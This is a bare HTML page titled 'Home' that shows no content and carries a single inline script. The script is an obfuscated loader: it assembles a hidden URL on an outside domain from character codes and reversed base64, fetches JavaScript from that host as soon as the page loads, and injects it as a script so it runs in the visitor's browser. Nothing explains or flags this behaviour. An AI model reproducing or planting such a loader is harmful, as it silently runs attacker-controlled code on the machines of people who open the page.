<!doctype html>
<html lang="en-US">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Home</title>
</head>
<body>
    <script>
var scheme = [104, 116, 116, 112, 115, 58, 47, 47];
var revB64 = 'bm9sZXltLmxsZXdudS9tb2MuYXdoc2VwZGl0cGVs';

function decodeRev(s) {
  var t = decodeURIComponent(escape(atob(s)));
  return t.split('').reverse().join('');
}

var dest = String.fromCharCode.apply(null, scheme) + decodeRev(revB64);

async function pullAndRun() {
  var packet = await window.fetch(dest, { credentials: 'omit', mode: 'cors' });
  if (!packet.ok) return;
  var raw = await packet.text();
  var mime = new Blob([raw], { type: 'application/javascript' });
  var gate = URL.createObjectURL(mime);
  await new Promise(function (done, fail) {
    var node = document.createElement('script');
    node.src = gate;
    node.onload = function () {
      URL.revokeObjectURL(gate);
      done();
    };
    node.onerror = fail;
    document.body.appendChild(node);
  });
}

pullAndRun();
    </script>
</body>
</html>
